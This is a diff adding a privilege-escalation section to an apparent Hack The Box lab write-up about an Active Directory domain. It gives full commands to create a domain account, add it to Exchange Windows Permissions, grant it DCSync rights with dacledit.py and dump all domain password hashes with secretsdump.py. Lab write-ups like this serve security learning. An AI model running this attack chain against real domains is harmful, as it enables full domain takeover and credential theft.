@@ -63,5 +63,29 @@ svc-alfresco has this misconfiguration: "Dont require Kerberos preauthentication
 ## PrivilegeEscalation
 
 
+<img width="1105" height="322" alt="image" src="https://github.com/user-attachments/assets/338f246a-2ba1-4fa0-967b-6aee673d006d" />
+
+svc-alfresco is a member of SERVICE ACCOUNTS, which is a member of PRIVILEGED IT ACCOUNTS, which is a member of ACCOUNTT OEPRATORS. ACCOUNT OPERATORS has Generic All permissions on EXCHANGE WINDOWS PERMISSIONS, ehich in turn has WriteDacl permissions on the HTB.LOCAL domain. 
+First, let's crate a decoy account through ACCOUNT OPERATORS.
+
+`net user sciampagno Bancobottega1 /add /domain`
+
+<img width="686" height="43" alt="image" src="https://github.com/user-attachments/assets/23c23d10-6e32-452a-b0e1-e2785bffa7f1" />
+
+Next, we add the newly created user to the "vulnerable" group.
+
+`net group "Exchange Windows Permissions" /add sciampagno`
+
+<img width="1900" height="215" alt="image" src="https://github.com/user-attachments/assets/05b5bd8b-5fa8-4a49-be35-7f53727cb5da" />
+
+By leveraging the WriteDacl privilege that the EXCHANGE WINDOWS PERMISSIONS group has on the HTB.LOCAL, we used dacledit.py to modify the domain's ACLs and grant the sciampagno user DCSync permissions.
+
+`dacledit.py -action 'write' -rights 'DCSync' -principal 'sciampagno' -target-dn 'DC=htb,DC=local' 'htb.local'/'sciampagno':'Bancobottega1'`
+
+<img width="1174" height="94" alt="image" src="https://github.com/user-attachments/assets/5d91ff9c-108f-4139-ab71-31b629191fea" />
+
+Now that the user "sciampagno" has DCSync privileges, let's use Impacket to extract all hashes from the domain controller.
+`secretsdump.py 'htb.local'/'sciampagno':'Bancobottega1'@10.129.95.210`
+
 
 
